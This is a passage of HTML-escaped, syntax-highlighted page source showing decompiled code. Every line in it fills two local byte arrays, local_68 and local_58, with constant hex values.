&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x36&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf3
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x36&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9a
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x37&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x21
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x37&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4f
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x38&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xaa
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x38&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf5
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x39&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcc
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x39&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xaf
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3a&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4a
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3a&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x22
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3b&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3b&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;99
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3c&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2e
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3c&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x42
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3d&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb0
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3d&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xdc
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3e&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd4
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3e&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb1
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3f&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8c
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3f&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe2
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x40&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x49
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x40&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2e
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x41&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3d
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x41&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x58
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x42&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa5
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x42&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x89
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x43&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7e
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x43&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1c
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x44&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8e
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x44&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xfb
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x45&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x15
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x45&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x61
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x46&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd9
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x46&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x86
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x47&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x41
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x47&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x28
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x48&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x98
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x48&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xec
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x49&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xef
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x49&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb0
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4a&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x90
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4a&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xfd
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4b&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x34
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4b&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5d
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4c&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa9
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4c&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xce
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4d&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4d&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x67
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4e&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7c
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4e&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4f&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4c
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4f&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x13
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x50&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x45
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x50&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x27
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x51&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7b
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x51&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1e
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x52&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6e
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x52&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x31
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x53&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x95
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x53&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf4
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x54&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3a
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x54&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x65
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x55&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x80
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x55&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe7
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x56&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcd
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x56&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa2
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x57&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7b
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x57&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x14
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x58&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe2
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x58&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x86
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x59&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9f
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x59&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc0
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5a&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3c
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5a&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x48
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5b&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcc
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5b&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa5
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5c&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6a
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5c&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5d&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf8
